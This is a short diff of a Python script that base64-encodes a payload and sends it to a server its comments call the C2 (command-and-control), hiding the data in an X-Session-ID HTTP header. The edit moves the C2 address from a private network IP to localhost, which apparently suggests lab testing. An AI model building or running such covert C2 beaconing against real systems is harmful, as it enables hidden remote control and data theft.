@@ -20,7 +20,7 @@ def main():
     # base64 encode the payload
     payload = base64.b64encode(payload)
     # Send the payload to the C2
-    request = requests.get("http://192.168.17.131:8001"+C2['path'], headers={"X-Session-ID": payload})
+    request = requests.get("http://127.0.0.1:23000"+C2['path'], headers={"X-Session-ID": payload})
     print(request.text)
 
 
